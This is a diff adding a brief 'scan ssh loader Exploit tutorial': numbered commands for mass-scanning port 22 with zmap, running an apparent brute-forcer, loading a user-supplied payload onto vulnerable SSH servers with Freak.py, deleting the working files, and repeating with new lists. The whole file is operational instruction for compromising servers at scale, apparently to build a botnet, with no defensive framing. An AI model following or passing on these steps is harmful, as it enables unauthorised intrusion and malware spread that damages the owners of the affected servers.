@@ -1,0 +1,19 @@
+|=======================================================================|
+  scan ssh loader Exploit tutorial
+|-----------------------------------------------------------------------|
+  (1) go into scan.py file | line 13 | replace payload with your payload 
+
+  (2) yum install python-paramiko
+   
+  (3) zmap -p22 -o mfu.txt -w your.lst
+
+  (4) ./update 5000
+
+  (5) python Freak.py vuln.txt
+
+  (6) rm -rf vuln.txt
+
+  (8) rm -rf mfu.txt
+
+  (-) repeat the whole steps again with a new list
+|=======================================================================|
